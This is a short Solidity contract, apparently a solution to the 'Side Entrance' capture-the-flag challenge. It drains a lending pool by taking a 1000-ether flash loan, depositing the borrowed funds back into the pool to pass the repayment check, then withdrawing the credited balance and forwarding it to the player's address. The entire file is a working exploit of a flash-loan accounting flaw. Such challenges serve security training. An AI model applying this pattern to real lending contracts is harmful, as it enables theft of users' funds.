// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceBorrower is IFlashLoanEtherReceiver {
    address private player;
    SideEntranceLenderPool private pool;
    bool private exit = false;

    constructor(address _player, SideEntranceLenderPool _pool) {
        player = _player;
        pool = _pool;
    }
    function steal() external {
        pool.flashLoan(1000 ether);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    function withdraw() external {
        pool.withdraw();
        player.call{value: 1000 ether}("");
    }

    receive() external payable {}
}
